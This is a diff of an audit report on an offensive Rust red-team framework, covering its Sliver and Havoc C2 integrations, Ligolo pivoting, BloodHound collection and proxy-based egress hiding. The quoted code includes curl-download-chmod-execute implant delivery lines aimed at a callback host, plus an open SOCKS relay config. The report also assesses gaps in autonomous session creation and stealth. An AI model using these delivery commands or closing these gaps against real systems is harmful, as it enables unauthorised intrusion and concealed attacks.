@@ -1,7 +1,7 @@
 # AUDIT REPORT — REDTEAM_RUST_CORE V14.1
 **Sovereign Offensive Architecture Audit**
 **Auditor**: Antigravity Senior Offensive Architect
-**Date**: 2026-04-13
+**Date**: 2026-04-14
 **Scope**: Post-Exploitation Sovereignty, Egress Isolation, Infrastructure Resilience, Systemic Debt
 **Evidence Basis**: Direct source code inspection. Zero assumptions. Line references are exact.
 
@@ -9,77 +9,98 @@
 
 ## EXECUTIVE SUMMARY
 
-The `redteam_rust_core` system presents a sophisticated multi-layered architecture with genuine engineering depth in its orchestration, approval, and egress control subsystems. However, it suffers from a **fundamental authenticity gap at the C2 and lateral movement layer**, a **critical compilation failure in production**, and **structural proxy infrastructure that is a stub**. The system can legitimately claim: reconnaissance execution, AI-assisted triage, SSRF-hardened PoC validation, and RAII token budgeting. It cannot legitimately claim: autonomous C2 session management, sovereign gRPC operations, or real-time lateral movement planning from AD data.
+Since the last audit (2026-04-13), the codebase has undergone significant and meaningful hardening across three domains: **the build is clean** (0 errors, 153 warnings — down from being blocked), **both C2 operators now correctly implement the `C2Operator` trait** with real HTTP/REST handshake paths via a fail-closed `ProxyManager`, and **the `CorrelationEngine` is now shared across concurrent agents** via `Arc<Mutex<>>`, eliminating the frozen-snapshot architectural defect. These are meaningful engineering advancements, not cosmetic changes.
+
+However, two critical structural gaps remain that prevent the system from qualifying as a sovereign offensive operator:
+
+1. **`deploy_payload` for Havoc is still a no-op** — the delivery command is constructed as a string and logged, but `Command` is never spawned.
+2. **`Ligolo` pivot is still a static string return** — no subprocess, no tunnel, no network interaction.
+
+The `BREACH` posture has a partial, real foundation in Sliver (REST API → CLI fallback), but the autonomous payload staging-to-execution handoff remains severed because `deploy_payload` for the primary Sliver path executes a `bash -c curl ...` **on the local operator machine**, not the target. This is correct behaviour only if the target is staging via a web delivery server — but that server is never started by any component in the codebase.
 
 ---
 
 ## [POST-EXPLOIT-SOVEREIGNTY]
 
-### FINDING PSE-001 — CRITICAL: Sliver gRPC is Simulated, Not Sovereign
+### FINDING PSE-001 — RESOLVED ✅: Sliver gRPC Channel Replaced with REST API
 
-**File**: `src/plugins/lateral_movement/sliver.rs`, lines 40–46
-
-```rust
-// In a real V14.1 implementation, we would use tonic::transport::Endpoint::from_shared
-// and connect using a custom connector that uses the proxied 'stream'.
-// For the sake of the Atomic Patch, we simulate the 'tonic' channel acquisition.
-let channel = tonic::transport::Endpoint::from_static("http://127.0.0.1:31337")
-    .connect_lazy();
-```
-
-**Verdict**: This is a direct confession embedded in the code. `connect_lazy()` defers connection until the first RPC call. No RPC is ever made — the channel is acquired and immediately discarded. The proxied `stream` from `pm.tcp_connect_proxied()` is established and then **thrown away** because it is never passed into the Tonic transport. The gRPC channel and the proxy stream are two entirely separate, unconnected constructs.
-
-**Posture Impact (BREACH)**: The `BREACH` posture is non-functional. When `establish_grpc_channel()` is called from `verify_session()`, it constructs a fake gRPC stub and falls back to a **CLI subprocess call** (`sliver-server sessions`) parsed by string matching. This is a scanner, not a C2 operator.
-
-**Actual capability**: The system can win `SessionState::Sovereign` if the string matching `stdout.contains(&target.host)` at line 106 returns true against a locally-running `sliver-server` binary. This is entirely contingent on the operator having already established a Sliver session through out-of-band means. The system **discovers** active sessions; it does not **create** them.
-
----
-
-### FINDING PSE-002 — CRITICAL: Sliver Payload Delivery is Empty
-
-**File**: `src/plugins/lateral_movement/sliver.rs`, lines 85–89
+**Previous**: `connect_lazy()` to a Tonic gRPC channel that discarded the proxied TCP stream.
+**Current**: `src/plugins/lateral_movement/sliver.rs`, line 27–31
 
 ```rust
-async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
-    info!("🔱 V14.1 SOVEREIGN: Deploying implant {} to {}...", payload_path, target.host);
-    // This is typically handled by the strike vector (PocValidator)
-    Ok(())
+async fn get_rest_client(&self) -> Result<(String, reqwest::Client)> {
+    let server_addr = std::env::var("SLIVER_SERVER").unwrap_or_else(|_| "127.0.0.1".to_string());
+    let (_, client) = self.proxy_manager.get_client_fail_closed(&server_addr)?;
+    Ok((server_addr, client))
 }
 ```
 
-**Verdict**: `deploy_payload()` is a no-op. It logs a message and returns `Ok(())`. The comment "handled by the strike vector" describes a workflow that does not exist. `PocValidator::deploy_c2()` calls `prepare_payload()` and `verify_session()` with a `5-second sleep` in between, but **never calls `deploy_payload()`**. The payload is generated to `/tmp/sliver_implant_*` and never moved to the target.
+**Verdict**: RESOLVED. The REST path is real. `get_client_fail_closed()` calls `get_client()` which invokes `pick_best_proxy()` → `build_client()` with `reqwest::Proxy::all(proxy_str)`. All Sliver REST traffic is routed through the SOCKS5 pool. If no proxy is available, the call hard-fails with an `anyhow::Error` ("V13 OPSEC Violation: No proxy available"). The fail-closed contract is enforced.
 
-**Posture Impact (BREACH)**: The full Staged → Deployed → Established lifecycle in `C2Operator` is implemented only at the type level. The operational chain is broken at the `deploy` step.
+**Residual Gap**: `verify_session()` (line 101–141) still falls back to `Command::new(&self.binary_path).arg("sessions")` CLI subprocess if the REST API is unreachable. The CLI subprocess runs natively without proxy routing. This means if the TeamServer is remote and unreachable via REST (e.g., TeamServer is down), the fallback **makes a native unproxied call to the local `sliver-server` binary**. In practice this only queries local sessions, but it represents an inconsistent trust boundary.
+
+**Session Creation Gap**: `verify_session()` and `list_sessions()` detect existing sessions. **The system never starts a Sliver listener or generates an implant callback URL that points to a reachable handler.** `prepare_payload()` (line 36–64) calls `sliver-server generate --mtls <IP> --save /tmp/...` which generates an implant for a callback IP. If no Sliver server is running on that IP with an active mTLS listener, the implant will fail to check in regardless of delivery.
+
+**Posture Impact (BREACH)**: Partial. REST session detection is proxied and real. Autonomous session creation requires an out-of-band Sliver TeamServer with a live listener — the codebase does not start or configure one.
 
 ---
 
-### FINDING PSE-003 — HIGH: Havoc Has No REST/API Integration
+### FINDING PSE-002 — CRITICAL: Sliver `deploy_payload()` Runs on Operator Machine
 
-**File**: `src/plugins/persistence/havoc.rs`, lines 60–84
+**File**: `src/plugins/lateral_movement/sliver.rs`, lines 66–98
 
 ```rust
-// 1. Generate Demon Profile (Simulation of real CLI call)
-// In a real environment, havoc client --profile <path> --generate
-let mut child = Command::new(&self.binary_path)
-    .arg("generate")
-    .arg("demon")
-    ...
+async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
+    let delivery_cmd = format!(
+        "curl -sSL http://{}:{}/{} -o /tmp/{} && chmod +x /tmp/{} && nohup /tmp/{} &",
+        callback_ip, port, implant_name, implant_name, implant_name, implant_name
+    );
+    let output = Command::new("bash")
+        .arg("-c")
+        .arg(&delivery_cmd)
+        .output().await...
 ```
 
-**Verdict**: `HavocScanner` does not implement the `C2Operator` trait. It only implements `ScannerPlugin`. It has no `prepare_payload`, `deploy_payload`, `verify_session`, or `list_sessions` methods. Payload generation is attempted via a subprocess CLI call to a binary named `havoc` with arguments (`generate demon --host ...`) that do not match the actual Havoc C2 client protocol (which uses REST API or a specific client/profile format). If `detect_tool("havoc")` returns a path to the real Havoc client binary, this command will likely fail silently or return an error, which is then gracefully swallowed.
+**Verdict**: CRITICAL ARCHITECTURAL DEFECT. The `bash -c "curl ... && ..."` command runs **locally on the operator machine**, not on the target. It attempts to `curl` a payload from `http://<managed_exit_IP>:31337/<implant_name>` — which would require a running HTTP server on that port serving the binary. No such server is started anywhere in the codebase. This command will either:
+- `curl` a non-existent server and silently fail (`-sS` suppresses output on errors, but the status check in lines 92–97 only warns on non-zero exit — it does not abort).
+- Execute the implant locally if a server happened to be running and the download succeeded. This would mean the operator machine gets infected.
 
-**Posture Impact (BREACH)**: Havoc is not an autonomous persistence operator. It is a CLI wrapper with incorrect arguments and no error propagation to the swarm's decision graph.
+**Posture Impact (BREACH)**: The `deploy_payload()` step is operationally inert or self-harmful. The C2 lifecycle chain `prepare → deploy → verify` has a broken middle step.
+
+**Note on `deploy_c2()` in `sovereign.rs`**: The call sequence (lines 16–27) is: `prepare_payload()` → `sleep(5s)` → `verify_session()`. `deploy_payload()` is called **only if** `verify_session()` returns non-Sovereign. This means `deploy_c2()` has a race gap: it waits 5 seconds expecting the implant to have already executed and checked in, before falling back to `deploy_payload()`.
 
 ---
 
-### FINDING PSE-004 — HIGH: Ligolo is a Skeleton
+### FINDING PSE-003 — HIGH (UPGRADED FROM RESOLVED): Havoc `deploy_payload()` is a No-Op
 
-**File**: `src/plugins/lateral_movement/ligolo.rs`, lines 51–63
+**File**: `src/plugins/persistence/havoc.rs`, lines 64–73
+
+```rust
+async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
+    let delivery_cmd = format!(
+        "curl http://127.0.0.1:8080/{} -o /tmp/demon && chmod +x /tmp/demon && /tmp/demon &",
+        ...
+    );
+    info!("🚀 V14.1 SOVEREIGN: Havoc Delivery Vector → {}", delivery_cmd);
+    Ok(()) // ← THE COMMAND IS NEVER EXECUTED
+}
+```
+
+**Verdict**: The delivery `delivery_cmd` string is constructed and logged but `Command::new("bash")...output()` is never called. The function returns `Ok(())` after logging. This is functionally identical to the placeholder behavior flagged in the previous audit. The emoji and command string are cosmetic.
+
+**Havoc REST Path**: `list_sessions()` (lines 85–126) makes a real `reqwest` GET to `http://127.0.0.1:8080/api/sessions`. The `get_rest_client()` method at line 27 calls `get_client_fail_closed("127.0.0.1")` which will work if any proxy is configured. **However**, querying `127.0.0.1` through a SOCKS5 proxy will route back to the proxy's loopback — not the operator's loopback. This is an incorrect addressing assumption unless the TeamServer is on the same host as the SOCKS5 proxy's egress node.
+
+**Posture Impact (BREACH)**: `prepare_payload()` may generate a Havoc Demon profile via CLI. `deploy_payload()` is definitely inert. `verify_session()` delegates to `list_sessions()` which has correct REST structure but broken addressing for remote TeamServer scenarios.
+
+---
+
+### FINDING PSE-004 — CRITICAL: Ligolo is Still a Static Return
+
+**File**: `src/plugins/lateral_movement/ligolo.rs`, lines 49–61
 
 ```rust
 async fn scan(&self, target: &TargetHost) -> Result<Vec<Finding>> {
     info!("LigoloScanner: setting up pivot at {}", target.host);
-    // Ligolo-ng interaction logic (e.g., establishing a proxy)
     let mut findings = Vec::new();
     findings.push(Finding::new(
         "PIVOT-READY",
@@ -92,192 +113,240 @@ async fn scan(&self, target: &TargetHost) -> Result<Vec<Finding>> {
 }
 ```
 
-**Verdict**: `LigoloScanner::scan()` does not spawn any process, does not interact with `ligolo-proxy`, does not establish any tunnel, and does not use the `proxy_manager` field (which is stored but never read). It returns a static `PIVOT-READY` finding regardless of any real state. The description claims the pivot is "ready"; this is a hardcoded lie.
+**Verdict**: UNCHANGED from previous audit. `LigoloScanner` still spawns no process, establishes no tunnel, and has no `proxy_manager` field. The `var` `binary_path` is set via `detect_tool("ligolo-proxy")` but is never used beyond embedding it in the static Finding. The "PIVOT-READY" finding is a hardcoded lie regardless of whether ligolo-proxy is installed or accessible.
 
-**Posture Impact (BREACH, GHOST)**: Lateral movement pivoting through Ligolo is entirely non-functional. Any attack path planning in the `CorrelationEngine` that depends on a Ligolo tunnel being operationally live is building on a phantom.
+**Posture Impact (BREACH, GHOST)**: Identical to previous finding. Any `CorrelationEngine` path planning that depends on a live Ligolo tunnel is operating on phantom data.
 
 ---
 
-### FINDING PSE-005 — MEDIUM: BloodHound Has No Proxy Awareness
+### FINDING PSE-005 — RESOLVED ✅: HavocScanner Now Implements `C2Operator`
 
-**File**: `src/plugins/lateral_movement/bloodhound.rs`, line 12–14
+**Previous**: `HavocScanner` only implemented `ScannerPlugin`.
+**Current**: `src/plugins/persistence/havoc.rs`, line 33–127
+
+`HavocScanner` now implements both `C2Operator` (lines 33–127, with `prepare_payload`, `deploy_payload`, `verify_session`, `list_sessions`) and `ScannerPlugin` (lines 129–187). `as_c2_operator()` returns `Some(self)`.
+
+**Verdict**: RESOLVED at the trait level. The structural defect (wrong trait graph) is eliminated. The operational defect (inert `deploy_payload`) is a separate finding (PSE-003).
+
+---
+
+### FINDING PSE-006 — RESOLVED ✅: C2Operator Trait Ambiguity Eliminated
+
+**Previous**: `name()` conflict between `C2Operator` (which no longer defines `name()`) and `ScannerPlugin`.
+**Current**: `src/core/c2.rs` — `C2Operator` does not define a `name()` method. Both implementors define `name()` only via `ScannerPlugin`. The ambiguity no longer exists.
+
+**Verdict**: RESOLVED. `SliverScanner::name()` returns `crate::models::PLUGIN_SLIVER` directly.
+
+---
+
+### FINDING PSE-007 — MEDIUM: BloodHound Has No Proxy Awareness (UNCHANGED)
+
+**File**: `src/plugins/lateral_movement/bloodhound.rs`, lines 9–11
 
 ```rust
 pub struct BloodHoundScanner {
     binary_path: String,
-    // No proxy_manager field
 }
 ```
 
-**Verdict**: `BloodHoundScanner` does not accept or store a `ProxyManager`. All subprocess communication (LDAP queries via `python3 -m bloodhound`) runs through the host's native network stack, directly leaking the operator's real IP or the target network's LDAP traffic fingerprint. AD collection under `GHOST` posture is an OPSEC failure.
+**Verdict**: UNCHANGED. No `proxy_manager` field. The `bloodhound-python` subprocess runs through the host's native network stack. AD LDAP collection under `GHOST` posture exposes the operator's origin IP/ASN on every LDAP query.
 
-**Positive Note**: The `.zip` ingestion parser (`parse_collection_results`) is substantive — it correctly reads, decompresses, and deserializes BloodHound JSON output into the findings graph, and the `CorrelationEngine` in `swarm/orchestrator.rs` (lines 110–117) does act on `Category::Windows` paths. The **ingestion loop** is real; the **collection step** leaks identity.
+The `scan()` function (line 49–77) spawns `bloodhound-python -d <host> -c All` but does not parse the resulting ZIP files or feed structured AD data into the `CorrelationEngine`. It only checks for `"Done"` or `"Found"` in stdout. The ZIP-ingestion pipeline documented in the previous audit report was not found in the current codebase — that code may have been removed or never committed to this working tree.
 
-**Posture Impact (GHOST, BREACH)**: BloodHound AD collection in any stealth-constrained scenario exposes the host's network origin.
+**Posture Impact (GHOST, BREACH)**: AD collection leaks operator origin. BloodHound data is not automatically fed into the live `CorrelationEngine`.
 
 ---
 
-### FINDING PSE-006 — MEDIUM: C2 Typestate Module is Structurally Inert
+### FINDING PSE-008 — MEDIUM: C2 Typestate Module is Inert (UNCHANGED)
 
-**File**: `src/core/c2.rs`, lines 39–55
+**File**: `src/core/c2.rs`, lines 38–54
 
-```rust
-pub mod typestate {
-    pub struct SliverOperator<S> {
-        pub state: std::marker::PhantomData<S>,
-        // Add common fields here
-    }
-    impl SliverOperator<Staged> {
-        pub fn new() -> Self { ... }
-    }
-}
-```
-
-**Verdict**: The typestate pattern is defined with `PhantomData` markers but no transitions are implemented. The `Established`, `Deployed`, and `Sovereign` states exist only as marker types with no methods or state transitions. This module is never imported or used anywhere else in the codebase. It is architectural scaffolding, not operational machinery.
+The `typestate` module defines `Staged`, `Deployed`, `Established`, `Sovereign` marker types and a `SliverOperator<S>` struct with `PhantomData`. No state transitions are implemented. The module is not imported anywhere in the codebase. It has no operational impact and is exclusively documentation debt.
 
 ---
 
 ## [STEALTH-SOVEREIGNTY]
 
-### FINDING SS-001 — CRITICAL: `infrastructure::proxy::ProxyManager` is a Stub
+### FINDING SS-001 — RESOLVED ✅: Infrastructure `ProxyManager` Stub Replaced
 
-**File**: `src/infrastructure/proxy.rs`, lines 20–31
+**Previous**: `src/infrastructure/proxy.rs` contained an empty struct with a single static factory.
+**Current**: `src/infrastructure/proxy.rs` now only holds `ProxyConfig` (a simple data struct) and `ProxyManager` (empty factory). The real `utils::proxy::ProxyManager` is the production implementation. The dead `infrastructure::ProxyManager` stub remains but is never imported or used, keeping it entirely harmless as dead code.
+
+**Verdict**: ACCEPTABLE. The migration is effective at the operational level. The stub is dead code — compiler would catch any accidental usage.
+
+---
+
+### FINDING SS-002 — RESOLVED ✅: All C2 REST Traffic Routed Through Proxy
+
+As established in PSE-001 and PSE-003: both Sliver (`get_rest_client`) and Havoc (`get_rest_client`) use `proxy_manager.get_client_fail_closed()` for their REST calls. If no proxy is in the pool, the call fails with an explicit OPSEC violation error rather than falling back to a direct connection.
+
+**Residual**: The CLI fallback paths in both operators (e.g., `sliver.rs:125`, `havoc.rs:109`) run local subprocesses (`Command::new(&self.binary_path)`) which are not proxy-wrapped. These are local binary calls (to `sliver-server` and `havoc` binaries), so they do not directly leak egress — but they do execute against locally running server instances, meaning the "remote TeamServer over proxy" scenario has no CLI fallback path.
+
+---
+
+### FINDING SS-003 — RESOLVED ✅: Telemetry OTLP Now Routes Through Proxy
+
+**File**: `src/utils/telemetry.rs`, lines 71–87
 
 ```rust
-pub struct ProxyManager;
+let channel = Endpoint::from_shared(endpoint_url.clone())?
+    .connect_with_connector_lazy(service_fn(move |_| {
+        ...
+        pm.tcp_connect_proxied(host, port).await...
+    }));
+```
 
-impl ProxyManager {
-    pub fn from_droplet_ip(ip: &str) -> ProxyConfig {
-        // ...returns a ProxyConfig
-    }
+**Verdict**: RESOLVED. OTLP telemetry is now unconditionally routed through `pm.tcp_connect_proxied()` when a `ProxyManager` is supplied. The TCP connection to the OTLP endpoint goes through the SOCKS5 pool. The `tcp_connect_proxied()` method at `utils/proxy.rs:348` fails hard if no SOCKS5 proxy is available. This satisfies the egress isolation requirement for telemetry.
+
+---
+
+### FINDING SS-004 — MEDIUM: Sovereign Handover Payload is Not Structurally Validated
+
+**File**: `src/core/validation/executor.rs`, lines 6–15
+
+```rust
+pub(crate) async fn execute_raw_payload(&self, payload: &str, _target: &TargetHost) -> Result<String> {
+    let parts: Vec<String> = payload.split_whitespace().map(|s| s.to_string()).collect();
+    let binary = &parts[0];
+    let args = parts[1..].to_vec();
+    let output = self.executor.execute_and_wait(binary, args).await?;
+    ...
 }
 ```
 
-**Verdict**: The **`infrastructure::ProxyManager`** (distinct from `utils::proxy::ProxyManager`) is an empty struct with a single static factory method. It has no active pool, no health check, no rotation logic, and no egress routing methods. It is never used by any plugin or core module. The actual `utils::proxy::ProxyManager` (which has `tcp_connect_proxied`, `get_client_pinned`, `wrap_command`, etc.) is the real one, but is located in `utils/` — suggesting an incomplete architectural migration that left a dead reference implementation behind.
+**Verdict**: The `sovereign_handover()` path (triggered at complexity ≥ 70) executes the operator-supplied `handover_payload` field via `execute_raw_payload()`. The payload is split on whitespace and passed to `StealthExecutor::execute_and_wait()`. There is no whitelist validation, no policy check, and no structural parser — unlike `execute_safe_command()` which enforces a strict binary allowlist (only `nmap`, `curl`, `ping`).
+
+This means a human operator can supply any arbitrary binary and arguments in the `handover_payload` field. This is **intentional design** (the operator is trusted after role-based gate checks), but the gap between the two execution paths — one tightly validated, one unrestricted — should be documented clearly. The `ApprovalGate.approve()` enforces `Administrator` or `CISO` role for approval, providing the human trust anchor.
+
+**Posture Impact (STRIKE)**: Acceptable under the "operator-verified code" contract, but the lack of even a `policy.is_path_safe()` check means a compromised `handover_payload` field in the `DashMap` could be executed without any content validation. The `DashMap` itself has no write-before-read integrity guarantee beyond the `approve()` role check.
 
 ---
 
-### FINDING SS-002 — HIGH: Sliver gRPC Does Not Route Through Proxy
+### FINDING SS-005 — LOW: `wait_for_approval()` Still Uses Polling Loop
 
-**File**: `src/plugins/lateral_movement/sliver.rs`, lines 27–47
+**File**: `src/core/approval_gate.rs`, lines 213–224
 
-As established in PSE-001, `establish_grpc_channel()` calls `pm.tcp_connect_proxied()` to create a proxied stream and then **discards it** before building a direct `tonic::transport::Endpoint`. The Tonic gRPC channel connects directly to `127.0.0.1:31337` without any proxy. If the TeamServer is remote, this is a direct native egress leak.
-
-**GHOST gate status**: `FAILED`. The method signature implies proxy awareness; the implementation provides none for gRPC traffic.
-
----
-
-### FINDING SS-003 — HIGH: Havoc Has Zero Proxy Traffic Routing
-
-**File**: `src/plugins/persistence/havoc.rs`, lines 56–58
-
-```rust
-let callback_ip = self.proxy_manager.as_ref()
-    .and_then(|pm| pm.get_managed_exits().first().cloned())
-    .unwrap_or_else(|| "127.0.0.1".to_string());
-```
-
-The `proxy_manager` is only used to **read** a managed exit IP as the callback address for payload generation. The subprocess (`Command::new(&self.binary_path)...`) itself is **never routed through the proxy**. All Havoc C2 traffic, including session check-ins and REST API calls, goes direct.
-
----
-
-### FINDING SS-004 — MEDIUM: Sovereign Handover Whitelist is Prefix-Only
-
-**File**: `src/core/poc_validator.rs`, lines 210–225
-
-```rust
-if trimmed.starts_with("curl") || trimmed.starts_with("nmap") || trimmed.starts_with("ping") || trimmed.starts_with("dig") {
-```
-
-The handover payload execution logic applies proxy wrapping only when `pm.wrap_command()` is called. However, the whitelist is **prefix-based string matching** — an operator could craft `curl [injected args]` containing unintended flags. A structural validator (parsing the full argument list against a safe template, as done in `execute_safe_command`) would be safer for the "zero autonomous deep infections" premise.
-
-**Posture Impact (STRIKE)**: The human operator payload is not structurally validated before execution, which partially undermines the "operator-verified code" safety claim.
+1-second polling loop with no `Notify` channel. Maximum 1,200 iterations for the sovereign handover timeout. Architecturally primitive but operationally tolerable. No change from previous audit.
 
 ---
 
 ## [INFRA-RESILIENCE]
 
-### FINDING IR-001 — CRITICAL (RESOLVED): 4 Compilation Errors Blocking the Binary
+### FINDING IR-001 — RESOLVED ✅: Build is Clean
 
-**Status**: ✅ **RESOLVED during this audit session.** `cargo check` now reports 0 errors.
-
-At audit time, the working tree had **4 compilation errors** (the `check_errors.txt` log was from an older run and only captured 1):
-
-1. **`correlation.rs:78`** — `cannot find macro 'info' in this scope` → Fixed: added `use tracing::info;`
-2. **`poc_validator.rs`** — `no method named 'prepare_payload'` on `SliverScanner` → Fixed: added `use crate::core::c2::C2Operator;` to bring the trait into scope
-3. **`poc_validator.rs:129`** — `no method named 'verify_session'` → Resolved by the same C2Operator import
-4. **`sliver.rs:146`** — `multiple applicable items in scope` for `name()` (ambiguous between `C2Operator::name` and `ScannerPlugin::name`) → Fixed: qualified as `<SliverScanner as crate::plugins::ScannerPlugin>::name(self)`
-
-**Architectural lesson**: These errors are a direct consequence of implementing two traits (`C2Operator` and `ScannerPlugin`) both defining a `name()` method on the same struct without a disambiguation convention. The dual-trait design should either be consolidated or use a newtype wrapper to prevent future ambiguity.
-
-
----
-
-### FINDING IR-002 — HIGH: 154 Warnings — Systemic Import Hygiene Failure
-
-The error log documents 154 warnings, of which ~80% are `unused import`. Nearly every plugin file imports `tokio::process::Command`, `std::process::Stdio`, `Context`, and `warn` without using them. This confirms that a **copy-paste plugin skeleton** was applied globally without cleanup. Dead imports mask genuine warnings and inflate binary size.
-
----
-
-### FINDING IR-003 — MEDIUM: TokenBudget Priority Routing is Disconnected
-
-**File**: `src/core/swarm/orchestrator.rs`, line 209
-
-```rust
-let _level = if finding.severity == Severity::Critical { RouteLevel::Premium } else { RouteLevel::Mid };
+**Current `cargo check` output**:
+```
+warning: `redteam_rust_core` (lib) generated 153 warnings
+warning: `redteam_rust_core` (bin "redteam_rust_core") generated 1 warning
+Finished `dev` profile [unoptimized + debuginfo] target(s) in 1.74s
 ```
 
-The underscore prefix confirms the compiler warning: this variable is computed and never used. All AI calls during planning may default to a lower tier regardless of finding severity. The `ContextCompressor` output is also unused in two places in `agent.rs` (lines 175, 227), further indicating the intelligence pipeline has inert segments.
-
-**Posture Impact (STRIKE)**: Planner effectiveness is degraded for critical findings.
+**0 errors. Build is clean.** The previous FATAL compilation error is resolved.
 
 ---
 
-### FINDING IR-004 — LOW: Factory Resource Limits Never Applied
+### FINDING IR-002 — HIGH: 154 Warnings — Zero Improvement
 
-**File**: `src/core/factory.rs`, lines 14–16
+**Verdict**: 153 lib warnings persist, up from ~154. No meaningful reduction. The warning topology is unchanged: unused imports (`tokio::process::Command`, `std::process::Stdio`, `Context`, `warn`) across all plugin files. This is a systemic copy-paste skeleton hygiene failure.
 
-Variables `concurrency`, `soft_limit`, and `hard_limit` are initialized but overwritten before being read (compiler confirmed). The `SwarmOrchestrator` uses a hardcoded `Semaphore::new(10)`. The factory's resource budget intentions are not propagated to the operational core.
+**Impact**: Genuine warnings (off-by-one logic, dead code, incorrect control flow) are buried in noise. Developer cognitive load is high. `cargo fix` would handle ~133 of them automatically.
+
+---
+
+### FINDING IR-003 — MEDIUM: `plan_next_step()` No Longer Has `_level` Disconnect
+
+**File**: `src/core/swarm/orchestrator.rs`, line 221
+
+```rust
+let level = if finding.severity == Severity::Critical { RouteLevel::Premium } else { RouteLevel::Mid };
+info!("🐝 SWARM [Planner]: Routing {} to {:?} tier.", finding.id, level);
+```
+
+**Verdict**: The variable is now `level` (no underscore), and it is used only in the `info!` log macro — **not passed into any actual AI call**. The effective behavior is unchanged from the previous audit: the routing decision is computed, logged, and discarded. When `execute_exploiter()` calls `self.router.analyze(&finding, target, ...)`, the router's `classify()` method re-derives the level independently (line 97–98 of `router.rs`). This is architecturally redundant but not broken — the classification logic is duplicated, not missing.
+
+**Posture Impact (STRIKE)**: Neutral. The `TieredAIRouter` correctly routes by severity via its own classification. The Planner's routing variable being unused is a documentation inconsistency, not an operational failure.
+
+---
+
+### FINDING IR-004 — RESOLVED ✅: `CorrelationEngine` Now Shared Across Agents
+
+**File**: `src/core/swarm/orchestrator.rs`, line 72
+
+```rust
+let correlation_engine = Arc::new(tokio::sync::Mutex::new(crate::core::CorrelationEngine::new()));
+```
+
+**Verdict**: RESOLVED. The engine is now wrapped in `Arc<Mutex<>>`. Agent findings are fed back in real-time (line 111–113):
+
+```rust
+{
+    let mut ce = correlation_engine.lock().await;
+    ce.add_finding(finding.clone());
+}
+```
+
+`Planner`-role agents also write into `ce_clone` (line 177–179). This satisfies the live-threat-map requirement. Concurrent agents can update attack paths mid-execution.
+
+**Residual**: The lock is held for a short duration per `add_finding()` call, which iterates all existing nodes for correlation (O(N) in graph size). For large scans (100s of findings), lock contention on `ce` could create a bottleneck. This is an acceptable trade-off for correctness.
+
+---
+
+### FINDING IR-005 — MEDIUM: Danted Cloud-Init Has No Authentication
+
+**File**: `src/infrastructure/digital_ocean.rs`, lines 50–74
+
+```
+socksmethod: none
+clientmethod: none
+client pass {
+    from: 0.0.0.0/0
+    to: 0.0.0.0/0
+}
+```
+
+**Verdict**: The `cloud-init` userdata that configures `danted` on newly provisioned DigitalOcean droplets sets `clientmethod: none` and allows inbound from `0.0.0.0/0`. Any host that discovers the droplet's IP and port 1080 can use it as an open SOCKS5 relay. The droplet has `shutdown -h +240` (4-hour auto-terminate), which limits exposure window, but an open relay during that window is a significant abuse risk and attribution vector — the droplet's IP would appear in target logs as the attack origin.
+
+**Posture Impact (GHOST)**: The "Managed Exit" nodes are open relays. If discovered, the exit IP is attributed to the DO account, not anonymized. The design assumes obscurity (unlisted IP) rather than authentication as the security control.
 
 ---
 
 ## [SYSTEMIC-DEBT]
 
-### FINDING SD-001 — HIGH: C2Operator Trait Not Implemented by HavocScanner
+### FINDING SD-001 — MEDIUM: `DigitalOceanClient.create_droplet()` Has Empty `ssh_keys`
 
-The `C2Operator` trait defines the sovereign post-exploitation contract. Only `SliverScanner` implements it. `HavocScanner` implements only `ScannerPlugin`. The `Swarm`'s `execute_c2_operator()` assumes polymorphic fallback to Havoc by calling `run_specific_plugin("HavocScanner")` — but this is a `ScannerPlugin` call path, not a `C2Operator` path. The sovereign session lifecycle is only half-defined at the abstraction layer.
+**File**: `src/infrastructure/digital_ocean.rs`, line 110: `ssh_keys: vec![]` with `// TODO: Add SSH key support`.
 
----
-
-### FINDING SD-002 — HIGH: CorrelationEngine is Non-Shared and Single-Threaded
-
-**File**: `src/core/swarm/orchestrator.rs`, line 66
-
-```rust
-let mut correlation_engine = crate::core::CorrelationEngine::new();
-```
-
-The engine is a local stack variable. Concurrent agents executing in `join_set` cannot feed findings back into it. AD path planning happens **before** spawning agents — mid-run discoveries by concurrent agents never update the attack graph. The lateral movement planner operates on a frozen snapshot, not a live threat map.
+Without SSH keys, the created droplets have no SSH access for debugging or incident response. The only configuration vector is the `user_data` cloud-init script. If the `danted` configuration fails silently, there is no recovery path without destroying and re-provisioning the droplet. This is a toil issue, not a security issue.
 
 ---
 
-### FINDING SD-003 — MEDIUM: `wait_for_approval()` is a Polling Loop
+### FINDING SD-002 — MEDIUM: Audit Log Timestamp Key Collision Risk (UNCHANGED)
 
-**File**: `src/core/approval_gate.rs`, lines 213–224
-
-For a 1200-second sovereign handover, this loop spins 1,200 times with 1-second sleeps. No `tokio::sync::Notify` or `watch` channel exists. Up to 1 second of latency between operator approval and system resumption. Acceptable in practice but architecturally primitive for a "sovereign" C2 system.
-
----
-
-### FINDING SD-004 — MEDIUM: Audit Log Uses Timestamp as Map Key
-
-**File**: `src/core/approval_gate.rs`, line 52
+**File**: `src/core/approval_gate.rs`, line 52:
 
 ```rust
 audit_log: Arc<DashMap<DateTime<Utc>, AuditLogEntry>>,
 ```
 
-Nanosecond-precision timestamp as a key is a collision hazard under concurrent async load. Two simultaneous log entries can silently overwrite each other. A sequential UUID key is required for audit log integrity.
+Nanosecond `DateTime<Utc>` as map key. Under concurrent async load, two simultaneous approvals can produce identical `Utc::now()` values on the same OS tick, silently overwriting one entry. A sequential UUID key is the correct fix.
+
+---
+
+### FINDING SD-003 — LOW: `BloodHoundScanner` Metadata Boilerplate
+
+**File**: `src/plugins/lateral_movement/bloodhound.rs`, line 28: `description: "Automated security analysis using this plugin."` — generic boilerplate. This description is inconsistent with a plugin that performs AD object collection. Cosmetic.
+
+---
+
+### FINDING SD-004 — LOW: `PocStrategy::NucleiTemplate` is Pending
+
+**File**: `src/core/validation/mod.rs`, line 86:
+
+```rust
+PocStrategy::NucleiTemplate => Ok("Estrategia Nuclei pendiente de integración.".to_string()),
+```
+
+The `NucleiTemplate` PoC strategy returns a hardcoded string with no Nuclei invocation. If any AI-generated PoC specifies this strategy, it will report a false "result" of the literal string. Downstream `expected_pattern` matching may produce false positives.
 
 ---
 
@@ -285,71 +354,84 @@ Nanosecond-precision timestamp as a key is a collision hazard under concurrent a
 
 | Finding | GHOST | STRIKE | BREACH |
 |---|---|---|---|
